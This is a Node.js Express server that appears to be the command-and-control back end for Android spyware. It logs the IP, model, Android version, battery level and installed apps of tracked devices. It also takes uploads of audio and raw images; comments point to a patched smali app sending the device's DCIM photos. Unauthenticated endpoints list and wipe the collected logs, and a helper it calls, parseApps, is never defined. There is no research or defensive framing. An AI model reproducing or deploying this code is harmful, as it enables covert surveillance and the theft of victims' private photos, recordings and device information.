const express = require('express');
const fs = require('fs');
const path = require('path');
const multer = require('multer');

const app = express();
app.use(express.json());

/* ================= CONFIG ================= */

const LOG_FILE = "logs.json";
const UPLOAD_DIR = path.join(__dirname, "uploads");

if (!fs.existsSync(UPLOAD_DIR)) {
  fs.mkdirSync(UPLOAD_DIR);
}

const upload = multer({
  dest: UPLOAD_DIR,
  limits: { fileSize: 10 * 1024 * 1024 } // 10MB
});

app.use('/uploads', express.static(UPLOAD_DIR));

/* ================= HELPERS ================= */

function getIP(req) {
  return (req.headers['x-forwarded-for'] || '').split(',')[0]
      || req.socket.remoteAddress
      || "unknown";
}

function saveLog(data) {
  try {
    fs.appendFileSync(LOG_FILE, JSON.stringify(data) + "\n");
  } catch (e) {
    console.log("Log error:", e.message);
  }
}

/* ================= TRACK ================= */

app.get('/track', (req, res) => {

  const data = {
    ip: getIP(req),
    model: req.query.model || "unknown",
    brand: req.query.brand || "unknown",
    android: req.query.android || "unknown",
    battery: Number(req.query.battery) || null,
    apps: parseApps(req.query.apps),
    time: new Date().toISOString()
  };

  console.log("\n🔥 DEVICE =====================");
  console.log(data);

  saveLog(data);

  res.json({ status: "ok" });
});

/* ================= UPLOAD ================= */

app.post('/upload-audio', (req, res) => {

  const contentType = req.headers['content-type'] || "";

  // 🔴 MULTIPART SUPPORT
  if (contentType.includes("multipart")) {
    upload.single('audio')(req, res, () => {

      if (!req.file) {
        return res.status(400).send("No file");
      }

      const url = `${req.protocol}://${req.get('host')}/uploads/${req.file.filename}`;

      console.log("📦 MULTIPART:", req.file.filename);

      saveLog({
        type: "multipart",
        file: req.file.filename,
        size: req.file.size,
        url,
        time: new Date().toISOString()
      });

      return res.json({ status: "uploaded", url });
    });

    return;
  }

  // 🔥 RAW UPLOAD (SMALI)
  let ext = ".jpg";

  if (contentType.includes("png")) ext = ".png";
  if (contentType.includes("jpeg")) ext = ".jpg";

  const fileName = Date.now() + ext;
  const filePath = path.join(UPLOAD_DIR, fileName);

  const stream = fs.createWriteStream(filePath);

  req.pipe(stream);

  req.on('end', () => {

    const url = `${req.protocol}://${req.get('host')}/uploads/${fileName}`;

    console.log("📸 RAW IMAGE:", fileName);
    console.log("IP:", getIP(req));

    saveLog({
      type: "raw",
      file: fileName,
      url,
      time: new Date().toISOString()
    });

    res.json({ status: "uploaded", url });
  });

  req.on('error', (err) => {
    console.log("Upload error:", err.message);
    res.status(500).send("error");
  });
});

/* ================= FILE VIEW ================= */

app.get('/audio/:name', (req, res) => {
  const filePath = path.join(UPLOAD_DIR, req.params.name);

  if (!fs.existsSync(filePath)) {
    return res.status(404).send("File not found");
  }

  res.sendFile(filePath);
});

/* ================= USERS ================= */

app.get('/users', (req, res) => {
  try {
    if (!fs.existsSync(LOG_FILE)) return res.json([]);

    const data = fs.readFileSync(LOG_FILE, "utf-8");

    const list = data
      .split("\n")
      .filter(Boolean)
      .map(x => {
        try { return JSON.parse(x); }
        catch { return null; }
      })
      .filter(Boolean);

    res.json(list);

  } catch (e) {
    res.json([]);
  }
});

/* ================= CLEAR ================= */

app.get('/clear', (req, res) => {
  fs.writeFileSync(LOG_FILE, "");
  res.send("Logs cleared");
});

/* ================= HEALTH ================= */

app.get('/health', (req, res) => {
  res.json({ status: "running" });
});

/* ================= HOME ================= */

app.get('/', (req, res) => {
  res.send("Tracker running (DCIM uploader ready)");
});

/* ================= START ================= */

const PORT = process.env.PORT || 3000;

app.listen(PORT, () => {
  console.log(`🚀 Server running on port ${PORT}`);
});
